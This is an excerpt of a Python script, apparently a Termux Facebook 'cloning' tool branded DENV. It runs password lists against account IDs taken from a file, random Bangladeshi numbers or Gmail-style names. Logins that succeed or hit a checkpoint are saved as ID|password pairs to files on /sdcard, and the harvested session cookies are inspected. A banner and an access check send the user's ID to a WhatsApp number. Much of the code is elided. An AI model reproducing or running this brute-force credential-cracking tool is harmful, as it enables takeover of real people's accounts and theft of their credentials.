...
\033[1;36m╚═════╝ ╚══════╝╚═╝  ╚═══╝  ╚═══╝  
    ...
    │ [✓] ᴏᴡɴᴇʀ:        𝗗𝗘𝗡𝗩 𝗪𝗨            │
    │ [✓] ɢɪᴛʜɪʙ:        𝗗𝗘𝗡𝗩𝗪𝗨.𝗣𝗬                │
    │ [✓] ᴡʜᴀᴛsᴀᴘᴘ:  092212213112         │
    │ [✓] ᴠᴇʀsɪᴏɴ:      \033[1;36m 1.0                    │
    │ [✓] sᴛᴀᴛᴜs:      : 𝗙𝗥𝗘𝗘 \033[1;376m            │
    └───────────────────────────────────────┘""")                                           
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+8801715394562?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def Spy():
	clear()
	#ckx()
	print(f" [1] 𝗳𝗶𝗹𝗲 𝗰𝗹𝗼𝗻𝗶𝗻𝗴  ")
	print(f" [2] 𝗕𝗗 𝗿𝗮𝗻𝗱𝗼𝗺 𝗰𝗹𝗼𝗻𝗶𝗻𝗴 ")
	print(f" [3] 𝗴𝗺𝗮𝗶𝗹 𝗰𝗹𝗼𝗻𝗶𝗻𝗴")
	print(f" [0] 𝗘𝗫𝗜𝗧 ")
	me=input(f' Choice : ')
	if me in ["2", "02"]:
		bd()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [ ᴅᴇɴᴠ ] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [ ᴅᴇɴᴠ-OK ] %s | %s'%(ids,pas))
                                open(f'/sdcard/ᴅᴇɴᴠ-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [ ᴅᴇɴᴠ-CP ] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/ᴅᴇɴᴠ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [ᴅᴇɴᴠ-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/ᴅᴇɴᴠ-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [ ᴅᴇɴᴠ-CP ] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/ᴅᴇɴᴠ.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  ᴅᴇɴᴠ, Siam, etc')
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[ ᴅᴇɴᴠ-OK ] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[ ᴅᴇɴᴠ-CP ] '+idf+' | '+ps+'\033[0;97m')
